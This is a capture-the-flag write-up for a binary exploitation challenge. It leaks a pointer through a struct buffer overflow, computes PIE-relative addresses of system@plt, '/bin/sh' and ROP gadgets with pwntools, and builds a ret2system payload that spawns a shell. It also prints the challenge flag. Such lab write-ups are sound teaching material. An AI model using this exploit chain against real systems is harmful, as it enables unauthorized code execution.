# solution for bearings check
## category: pwn
firstly, i check the protections of the file. 
```bash
pwndbg> checksec
File:     /home/syntax/Downloads/bearings check/bearings_check/chal
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```
so that means i'll have to leak the addresses if i want my solvescript to work on remote.

looking at the source code, i realise that the struct
```c
struct proving_ground {
    char name[32];
    void* main_ref;
    char pad[8];
    char vuln[32];
};
```

is arranged in a way such that main ref comes right after name. which means in theory that if i overflow the 32 byte buffer in name, i should theoretically be able to leak main_ref. and lo and behold, when i send in 32 bytes or more, some garbled characters pop up, which i know should be my leaked address. i'll then use `context.log_level = 'debug'` in order to get my address.

so that's the main_ref settled, and now i can get all of the other addresses by using main_ref. the addresses that i'll need are the pie base, the `gifts()` function addess, system@plt address, the pop rdi; ret gadget, and just in case, a ret gadget address. so how do i leak these? 

to calculate the pie base, i just use `main_ref - elf.symbols['main']` in order to get it. it should end in 000 or else it's wrong. everything else should be smooth sailing from here. 

the elf file in this case is the local binary. 

i use `pie_base + elf.symbols['gifts']` to calculate my `gifts()` address, `pie_base + elf.plt['system']` to get my system address, `elf.search(b"/bin/sh\x00")` to find my bin/sh offset before using `pie_base + next(binsh_offset)` to get the address of bin/sh. 

the pop rdi gadget is a little more complicated to find, i used
```python
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rdi_ret_addr = pie_base + pop_rdi_ret
```
to get it, and i used
```python
ret_gadget = rop.find_gadget(['ret'])[0]
ret_addr = pie_base + ret_gadget
```
to get the ret gadget address. 

okay great, once i've gotten all of my addresses, i can craft my payload.
```python
payload = b'A' * 32
payload += p64(ret_addr)
payload += p64(ret_addr)
payload += p64(pop_rdi_ret_addr)      # gadget address to control rdi
payload += p64(binsh_addr)       # address of "/bin/sh" string
payload += p64(system_plt)   # address of system@plt
```
the payload is arranged in the order such that it fills the buffer first, then alignts the stack using the ret gadgets, before controlling the rdi register using the pop rdi gadget, then sending in the bin/sh string which will be placed into the rdi register by the gadget, then the address of system@plt which will execute `system("bin/sh")`.

and boom after sending all that, you will get your flag, which is `sctf{N0W_1_C4N_T3LL_T0P_FR0M_B0TT0M}`!